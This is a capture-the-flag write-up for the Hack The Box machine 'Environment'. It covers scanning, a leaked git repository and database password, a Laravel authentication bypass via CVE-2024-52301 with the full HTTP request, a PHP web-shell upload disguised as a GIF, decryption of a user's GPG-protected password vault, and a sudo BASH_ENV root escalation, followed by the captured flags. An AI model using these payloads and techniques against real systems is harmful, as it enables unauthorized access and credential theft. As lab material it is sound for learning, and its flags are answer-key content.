```json
Alias: Environment
Date: 04-05_2025
Platform: Hackthebox
OS: Linux
Difficulty: Medium
Status: Complete
IP: 10.10.11.67
```

# Environment
# Summary

What a pain

---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-04 00:00 PKT
Nmap scan report for 10.10.11.67
Host is up (0.28s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey:
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Did not follow redirect to http://environment.htb
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.53 seconds
```
## Discovered Subdomains
```
environment.htb
```

---
# Enumeration

Found a git repository hosted on the website, we can run git_dumper.py

```bash
./git_dumper.py http://10.10.11.58/ ~/Documents/CTF/Hackthebox/Labs/Environment/gitdump
```

There is also a `.DS_STORE` file exposed which is used by directories in mac to store metadata about directories but we can't enumerate since it's returning a 403. Although we can usually enumerate a git repository even if it returns a 403 on `.git`.

Found mysql credentials in `settings.php`

```
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
```

Sending a get request to `/upload` returns a huge error message that reveals:

```
PHP 8.2.28 — Laravel 11.30.0
```

It somehow seems that the git repository may not be related to the website...

Which it isn't, So now, if we send a login POST request and change the email parameter to something else like `email1`, we get a debug page showing the top half of the login function. To see the bottom page, I change the remember parameter to something like `Falst` and we find this

```php
	if(App::environment() == "preprod") { //QOL: login directly as me in dev/local/preprod envs
        $request->session()->regenerate();

        $request->session()->put('user_id', 1);

        return redirect('/management/dashboard');
    }
```

If the environment variable is `preprod` it logs us in directly. This aligns perfectly with https://github.com/Nyamort/CVE-2024-52301 which allows us to change the production environment. So, if we sent this request:

```
POST /login?--env=preprod HTTP/1.1
Host: environment.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 108
Origin: http://environment.htb
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://environment.htb/login
Cookie: XSRF-TOKEN=eyJpdiI6IkV4N3R0SjBadDNGUld2NVQwQlFvR2c9PSIsInZhbHVlIjoidERpdzN0Sm91RmdnN1VyRVVDRHJqbUtMbTNQSGVaT3pSb240ZS9STHp1NGZMaEdBRDJqZEx3QTZ6blp4Mzk2NzFrRENxY0NNWkQrYU52WDFydTBGMDJaWk9PbWtzemo0cXB5SjRyQjhPLzcyaElLN3gvMENFbnNxakp1aERBVHAiLCJtYWMiOiI3ZGMyNmM2NTU0NGIyOTIxMjhhZDM0NzNmMjUzZmM3ZGU5YzQ2NTMwYTFjMGFmNzMwMmZlMjQxMDRmN2U2ODU2IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IndkNU8rci96QlhPQmJ2S3AyUXJMVVE9PSIsInZhbHVlIjoiazdibmNGZ29jdmtzMkpqbmlibHJrWmFtUVBlVEMvTUxzb1RrMmdNU0trRzJ2eEEzRDVIb2JxSTVHZmRQdE1HT3cvNUo5UnczZGxFUDRkOG9tS2dwNGhnQi9Zc2VuWmtvbE1CSW1DWXhpaXdsd2RHUGlYVGRROVlIYUFKZ1RyZ1MiLCJtYWMiOiJmYzgyYWMwMGY1ZmQwYzM4Njk3NjdmN2Q0NmI2M2FmZDEzMmE4MjkzMTc5ZmI2NmRiNTZkM2E3NDA0NzUyMTk3IiwidGFnIjoiIn0%3D
Upgrade-Insecure-Requests: 1
Priority: u=0, i

_token=urOqQYdKl01fHmCHlK6N2UxoDcQoLKOs6V1awlpN&email=asd%40sada.ads&password=a&remember=False
```

We should get logged in directly

Next, to get shell as `www-data`, we can use this payload

```
POST /upload HTTP/1.1
Host: environment.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://environment.htb/management/profile
Content-Type: multipart/form-data; boundary=---------------------------57723367141411505303057035432
Content-Length: 411
Origin: http://environment.htb
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Cookie: XSRF-TOKEN=eyJpdiI6ImpyZXZjUzVEdkdWTHMvM3dpT3FWUkE9PSIsInZhbHVlIjoibjVnSVVRcStVSVd0VFRhSW4xQ3RLazBTZEkrVnhVZkY3MEdoS25vZndaMmpEcEZZNUFuakJxcDd5akJEaTh4SFE1NXlWMW5EY2pYSDhPSmwzUkZDbWcrelhJTjVsODZvaXkyaWRlSkhHS1RRT0JlR3VNQVVzTVJuTHR0dkxwSGsiLCJtYWMiOiIyOTA2ZWZjYjUzZmRiNzk0NmU1YjMyZmRhMjk3OThmYzBmNTUyNmU3ZDMwOTJmZDFkY2E5YzRiNTRjMjc0NWFjIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IlBaN0Z6T1hUZ0NzOXV1Q2FuS0xZSFE9PSIsInZhbHVlIjoiY2gzeVYxc3F4a1ovbm5ScVc3dzdkc1pEUE5iaW9qdk8yMnE0bGNXT2dvcnlNTWw0MGppd21VN2ZBZDBNYld4M3NkeHA4MUNTNzEyTEltQmJMWDVsRW9EbEdKUmp3MUMzVHNGQll0R2U0L0xrRDcrOGJBQzl1YU5LNHlzK0JURXEiLCJtYWMiOiI0OGUzNzkxZjVjZjNhNzA1YjIzZjY4ZWRmYjYxYjU0MzA1NmNlYzQxN2VmMjhlOGJlOTA0MzkzMzE0MjliMDQ1IiwidGFnIjoiIn0%3D
Priority: u=0

-----------------------------57723367141411505303057035432
Content-Disposition: form-data; name="_token"

IiAmMD1GCGVYvR2WWWt1QUFZRbrL02p80hdByTUO
-----------------------------57723367141411505303057035432
Content-Disposition: form-data; name="upload"; filename="image.php."
Content-Type: image/gif

GIF87a
<?php system($_GET["cmd"]); ?>

-----------------------------57723367141411505303057035432--

```



---

# Exploitation

We can access `/home/hish/.gnupg` zip the file and transfer to your computer, next get the file in `/home/hish/backup`, we can then decrypt it using

```bash
gpg --homedir . --decrypt keyvault.gpg

gpg: encrypted with rsa2048 key, ID B755B0EDD6CFCFD3, created 2025-01-11
      "hish_ <hish@environment.htb>"
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM -> summerSunnyB3ACH!!
```

and we get

| Username | Password         |
| -------- | ---------------- |
| hish     | marineSPm@ster!! |

---
# Privilege Escalation

The path to root is simple, if you do `sudo -l` you can see that

```
Matching Defaults entries for hish on environment:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="ENV BASH_ENV", use_pty

User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo

```

We can keep the environment variable `BASH_ENV`, any script's path set as the value to this variable is sourced when bash is started non-interactively.

So create a simple script:

```bash
#!/bin/bash
bash
```

```bash
chmod +x test.sh
BASH_ENV=./test.sh sudo /usr/bin/systeminfo
```

And we are root!

---

# Flags
- 4886e10934f3de26155dccf4cc123c0e
- 31074aa02df560d044007a99ef3a283f

#CTF